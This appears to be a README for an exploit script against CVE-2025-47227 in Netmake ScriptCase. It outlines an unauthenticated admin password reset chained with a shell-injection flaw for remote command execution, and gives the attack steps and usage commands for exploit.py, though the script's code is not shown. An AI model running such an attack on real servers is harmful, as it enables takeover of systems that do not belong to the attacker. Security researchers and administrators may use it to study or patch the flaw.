---

### ⚠️ CVE-2025-47227 Overview

* 🛡️ **Type:** Authentication bypass vulnerability
* 🖥️ **Affected software:** Netmake ScriptCase, Production Environment module, versions up to 9.12.006
* 🔓 **Impact:** Allows unauthenticated attackers to reset admin password and gain full access.

---

### 🛠️ Technical Details

* ⚠️ Vulnerability in the password reset mechanism allows bypassing authentication.
* 📩 Attacker sends crafted GET and POST requests to `login.php` to reset admin password.
* 👤 Single admin user makes privilege takeover easy.

---

### 🔗 Exploitation Chain

* 🔥 Can be chained with CVE-2025-47228 (shell injection) for remote command execution (RCE).
* Steps:

  1. 🔑 Reset admin password via the flaw.
  2. 🔓 Log in with new credentials.
  3. 💻 Execute arbitrary commands via shell injection.

### 🛠️ Usage

An exploitation script was written to handle several scenarios:

+ Perform the pre-authentication remote command execution by chaining the two vulnerabilities (password reset and authenticated command execution)
+ Only perform the password reset
+ Only perform authenticated command execution
+ Detect the deployment path

```
Usage:
  Examples:

  Pre-Auth RCE (password reset + RCE)
    python exploit.py -u http://example.org/scriptcase -c "command"
  Password reset only (no auth)
    python exploit.py -u http://example.org/scriptcase
  RCE only (need account)
    python exploit.py -u http://example.org/scriptcase -c "command" -p 'Password123*'
  Detect deployment path
    python exploit.py -u http://example.org/ -d


Options:
  -h, --help            show this help message and exit
  -u BASE_URL, --base-url=BASE_URL
  -c COMMAND, --command=COMMAND
  -p PASSWORD, --password=PASSWORD
  -d, --detect
```
